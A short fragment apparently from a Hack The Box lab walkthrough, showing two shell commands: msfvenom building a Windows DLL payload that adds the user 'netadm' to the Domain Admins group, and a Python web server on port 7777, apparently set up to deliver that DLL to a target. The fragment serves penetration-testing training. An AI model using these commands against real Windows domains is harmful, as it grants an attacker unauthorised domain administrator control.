...
```shell-session
Hillside_1@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
...
```shell-session
Hillside_1@htb[/htb]$ python3 -m http.server 7777
